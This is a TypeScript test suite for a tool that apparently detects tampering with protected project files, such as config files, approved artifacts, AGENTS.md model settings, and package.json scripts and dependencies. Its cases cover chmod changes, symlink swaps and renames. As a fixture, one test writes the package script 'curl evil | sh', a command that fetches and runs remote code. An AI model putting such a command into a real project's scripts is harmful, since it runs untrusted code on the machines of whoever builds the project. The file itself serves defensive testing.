import { chmod, mkdir, readFile, rename, rm, symlink, writeFile } from "node:fs/promises";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { captureProtected, protectedFindings } from "../src/application/workflow/protected.js";
import { describeProtectedChanges, diffSnapshots } from "../src/domain/protected.js";
import { sha256 } from "../src/infrastructure/crypto/sha256.js";
import { FsIntegrityReader } from "../src/infrastructure/fs/integrity.js";
import { NodeWorkspaceFs } from "../src/infrastructure/fs/workspace-fs.js";
import { tempWorkspace } from "./helpers/workspace.js";

const AGENTS = (lines: string): string =>
  `# Project\n\n\`\`\`frontsmith-models\n${lines}\n\`\`\`\n`;
const PACKAGE = (scripts: Record<string, string>, deps: Record<string, string> = {}): string =>
  JSON.stringify({ name: "app", scripts, dependencies: deps });

const files = {
  ".frontsmith/config.json": '{"schemaVersion":1}\n',
  ".frontsmith/waivers.json": '{"schemaVersion":1,"waivers":[]}\n',
  "AGENTS.md": AGENTS("tier.fast = inherit"),
  "package.json": PACKAGE({ test: "vitest run", lint: "biome check ." }, { react: "^19.0.0" }),
  "pnpm-lock.yaml": "lockfileVersion: 9\n",
  "docs/frontsmith/projects/spec.json": '{"kind":"spec"}\n',
  "src/app.ts": "export {};\n",
};

const deps = {
  integrity: new FsIntegrityReader(),
  fsFor: (root: string) => new NodeWorkspaceFs(root),
  sha256,
};
const request = (root: string, approvedDependencies: string[] = []) => ({
  root,
  artifactPaths: ["docs/frontsmith/projects/spec.json"],
  approvedDependencies,
});

describe("snapshot comparison", () => {
  it("reports added, removed and modified keys, sorted", () => {
    expect(diffSnapshots({ a: "1", b: "2", c: "3" }, { a: "1", b: "9", d: "4" })).toEqual([
      { key: "b", kind: "modified" },
      { key: "c", kind: "removed" },
      { key: "d", kind: "added" },
    ]);
    expect(diffSnapshots({ a: "1" }, { a: "1" })).toEqual([]);
  });

  it("names the files and the three ways out", () => {
    const text = describeProtectedChanges(
      [{ key: "file:.frontsmith/config.json", kind: "modified" }],
      "projects",
    );
    expect(text).toContain(".frontsmith/config.json");
    expect(text.toLowerCase()).toContain("inspect");
    expect(text).toContain("/frontsmith:approve projects config");
  });
});

describe("protected set (spec 8.5)", () => {
  it("covers .frontsmith, approved artifacts, the models block, scripts and dependency maps", async () => {
    const ws = await tempWorkspace(files);
    try {
      const snapshot = await captureProtected(deps, request(ws.root));
      const keys = Object.keys(snapshot);
      expect(keys).toEqual(
        expect.arrayContaining([
          "file:.frontsmith/config.json",
          "file:.frontsmith/waivers.json",
          "file:docs/frontsmith/projects/spec.json",
          "agents-md:models",
          "package.json:scripts",
          "package.json:dependencies",
        ]),
      );
      expect(keys.filter((key) => key.startsWith("info:"))).toEqual(["info:lockfile"]);
      expect(keys).not.toContain("file:src/app.ts");
    } finally {
      await ws.cleanup();
    }
  });

  it("sees an edit, a deletion and a new file under .frontsmith", async () => {
    const ws = await tempWorkspace(files);
    try {
      const before = await captureProtected(deps, request(ws.root));
      await writeFile(join(ws.root, ".frontsmith/config.json"), '{"schemaVersion":1,"x":1}\n');
      await rm(join(ws.root, ".frontsmith/waivers.json"));
      await ws.write(".frontsmith/packs/evil/pack.json", "{}");
      const changes = diffSnapshots(before, await captureProtected(deps, request(ws.root)));
      expect(changes.map((c) => `${c.kind}:${c.key}`)).toEqual([
        "modified:file:.frontsmith/config.json",
        "added:file:.frontsmith/packs/evil/pack.json",
        "removed:file:.frontsmith/waivers.json",
      ]);
      expect(protectedFindings(changes)[0]).toMatchObject({
        ruleId: "FS-GOV-001",
        severity: "blocker",
        status: "FAIL",
      });
    } finally {
      await ws.cleanup();
    }
  });

  it("sees a chmod and a symlink replacement that a content hash alone would miss (S-R16)", async () => {
    const ws = await tempWorkspace(files);
    try {
      const before = await captureProtected(deps, request(ws.root));
      await chmod(join(ws.root, ".frontsmith/config.json"), 0o755);
      const afterChmod = await captureProtected(deps, request(ws.root));
      expect(diffSnapshots(before, afterChmod).map((c) => c.key)).toEqual([
        "file:.frontsmith/config.json",
      ]);

      await chmod(join(ws.root, ".frontsmith/config.json"), 0o644);
      const text = await readFile(join(ws.root, ".frontsmith/config.json"), "utf8");
      await writeFile(join(ws.root, "elsewhere.json"), text);
      await rm(join(ws.root, ".frontsmith/config.json"));
      await symlink(join(ws.root, "elsewhere.json"), join(ws.root, ".frontsmith/config.json"));
      const afterLink = await captureProtected(deps, request(ws.root));
      expect(diffSnapshots(before, afterLink).map((c) => c.key)).toContain(
        "file:.frontsmith/config.json",
      );
    } finally {
      await ws.cleanup();
    }
  });

  it("sees a move over the file and a rewrite of an approved artifact", async () => {
    const ws = await tempWorkspace(files);
    try {
      const before = await captureProtected(deps, request(ws.root));
      await writeFile(join(ws.root, "decoy.json"), '{"schemaVersion":1,"decoy":true}\n');
      await rename(join(ws.root, "decoy.json"), join(ws.root, ".frontsmith/config.json"));
      await writeFile(
        join(ws.root, "docs/frontsmith/projects/spec.json"),
        '{"kind":"spec","edited":1}\n',
      );
      const keys = diffSnapshots(before, await captureProtected(deps, request(ws.root))).map(
        (c) => c.key,
      );
      expect(keys).toEqual([
        "file:.frontsmith/config.json",
        "file:docs/frontsmith/projects/spec.json",
      ]);
    } finally {
      await ws.cleanup();
    }
  });

  it("sees changes to the models block, the scripts and the dependency maps, but not to other text", async () => {
    const ws = await tempWorkspace(files);
    try {
      const before = await captureProtected(deps, request(ws.root));
      await writeFile(
        join(ws.root, "AGENTS.md"),
        `${AGENTS("tier.fast = inherit")}\nExtra prose outside the block.\n`,
      );
      expect(diffSnapshots(before, await captureProtected(deps, request(ws.root)))).toEqual([]);
      await writeFile(join(ws.root, "AGENTS.md"), AGENTS("tier.fast = openai/gpt-5"));
      expect(
        diffSnapshots(before, await captureProtected(deps, request(ws.root))).map((c) => c.key),
      ).toEqual(["agents-md:models"]);

      await writeFile(join(ws.root, "AGENTS.md"), AGENTS("tier.fast = inherit"));
      await writeFile(
        join(ws.root, "package.json"),
        PACKAGE({ test: "curl evil | sh", lint: "biome check ." }, { react: "^19.0.0" }),
      );
      expect(
        diffSnapshots(before, await captureProtected(deps, request(ws.root))).map((c) => c.key),
      ).toEqual(["package.json:scripts"]);

      await writeFile(
        join(ws.root, "package.json"),
        PACKAGE(
          { test: "vitest run", lint: "biome check ." },
          { react: "^19.0.0", leftpad: "1.0.0" },
        ),
      );
      expect(
        diffSnapshots(before, await captureProtected(deps, request(ws.root))).map((c) => c.key),
      ).toEqual(["package.json:dependencies"]);
    } finally {
      await ws.cleanup();
    }
  });

  it("ignores an approved dependency (W-11) but still sees scripts changes", async () => {
    const ws = await tempWorkspace(files);
    try {
      const before = await captureProtected(deps, request(ws.root, ["leftpad"]));
      await writeFile(
        join(ws.root, "package.json"),
        PACKAGE(
          { test: "vitest run", lint: "biome check ." },
          { react: "^19.0.0", leftpad: "1.0.0" },
        ),
      );
      expect(
        diffSnapshots(before, await captureProtected(deps, request(ws.root, ["leftpad"]))),
      ).toEqual([]);
      await writeFile(
        join(ws.root, "package.json"),
        PACKAGE({ test: "x" }, { react: "^19.0.0", leftpad: "1.0.0" }),
      );
      expect(
        diffSnapshots(before, await captureProtected(deps, request(ws.root, ["leftpad"]))).map(
          (c) => c.key,
        ),
      ).toEqual(["package.json:scripts"]);
    } finally {
      await ws.cleanup();
    }
  });

  it("does not follow a symlink out of the workspace and tolerates missing files", async () => {
    const ws = await tempWorkspace({ "package.json": "not json" });
    try {
      await mkdir(join(ws.root, ".frontsmith"), { recursive: true });
      await symlink("/definitely/not/here", join(ws.root, ".frontsmith/dangling.json"));
      const snapshot = await captureProtected(deps, request(ws.root));
      expect(snapshot["file:.frontsmith/dangling.json"]).toMatch(/^link:/);
      expect(snapshot["package.json:scripts"]).toBeDefined();
    } finally {
      await ws.cleanup();
    }
  });
});
